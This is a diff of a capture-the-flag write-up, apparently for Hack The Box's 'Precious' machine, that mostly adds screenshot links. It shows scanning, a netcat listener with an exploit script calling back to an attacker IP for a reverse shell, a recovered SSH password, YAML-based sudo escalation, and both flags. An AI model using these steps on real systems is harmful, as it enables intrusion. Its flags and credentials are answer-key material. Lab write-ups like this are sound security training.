@@ -12,6 +12,8 @@
 ```bash
 nmap -sV -sC -oA nmap/Precious 10.129.99.246
 ```
+![nmap](img/nmap.png)
+
 **Open Ports:**
 - 22/tcp (OpenSSH 8.4p1 Debian)
 - 80/tcp (nginx 1.18.0)
@@ -24,32 +26,33 @@ nmap -Pn -n --open -p- --max-retries 1 --min-rate 2000 -oA nmap/fullTcp 10.129.9
 ```
 10.129.99.246   precious.htb
 ```
-`http://precious.htb` 접속 → 웹페이지에서 URL을 받아 PDF로 변환해주는 기능 발견
+![webpage](img/webpage.png)
 
 ---
 
 ## Task 1 - Web Server Software
-**Q:** nginx is running with what additional software?  
-**A:** `Phusion Passenger` (Burp에서 Server 헤더 확인)
+![burpsuite](img/burpsuite.png)
+
+**A:** `Phusion Passenger`
 
 ---
 
 ## Task 2 - Scripting Language
-**Q:** Which HTTP header reveals the scripting language?  
+
 **A:** `X-Runtime`
 
 ---
 
 ## Task 3 - Ruby PDF Library
-**Q:** Which Ruby library is used for PDF generation?  
+
 **A:** `pdfkit`
 
 ---
 
 ## Task 4 - CVE
-**Q:** Which 2022 CVE applies to pdfkit?  
-**A:** `CVE-2022-25765`  
-출처: [exploit-db #51293](https://www.exploit-db.com/exploits/51293)
+![exploit](img/exploit.png)
+
+**A:** `CVE-2022-25765`
 
 ---
 
@@ -58,13 +61,14 @@ nmap -Pn -n --open -p- --max-retries 1 --min-rate 2000 -oA nmap/fullTcp 10.129.9
 cd /home/ruby
 ls -al
 ```
+![bundle](img/bundle.png)
+
 **A:** `.bundle`
 
 ---
 
 ## Initial Foothold (User Access)
 
-exploit.py 실행:  
 ```bash
 nc -nlvp 9999
 python3 exploit.py -s 10.10.14.156 9999 -w http://precious.htb/ -p url
@@ -74,6 +78,7 @@ python3 exploit.py -s 10.10.14.156 9999 -w http://precious.htb/ -p url
 ```
 henry:Q3c1AqGHtoI0aXAYFH
 ```
+![henry](img/henry.png)
 
 ```bash
 ssh henry@10.129.99.246
@@ -84,6 +89,8 @@ Password: Q3c1AqGHtoI0aXAYFH
 ```bash
 cat /home/henry/user.txt
 ```
+![userflag](img/userflag.png)
+
 **Flag:** `ba2f03d84f25b774b3b262c153ff72a0`
 
 ---
@@ -92,16 +99,20 @@ cat /home/henry/user.txt
 ```bash
 sudo -l
 ```
+![update_dependencies](img/update_dependencies.png)
+
 **A:** `/usr/bin/ruby /opt/update_dependencies.rb`
 
 ---
 
 ## Task 8 - 사용자 입력을 받는 파일
+
 ```ruby
 def list_from_file
   YAML.load(File.read("dependencies.yml"))
 end
 ```
+
 **A:** `dependencies.yml`
 
 ---
@@ -136,11 +147,14 @@ end
 ```bash
 sudo /usr/bin/ruby /opt/update_dependencies.rb
 ```
+![root](img/root.png)
 
 ### Root Flag
 ```bash
 cat /root/root.txt
 ```
+![rootflag](img/rootflag.png)
+
 **Flag:** `18c457ee30e36677778fe36b29518c8d`
 
 ---
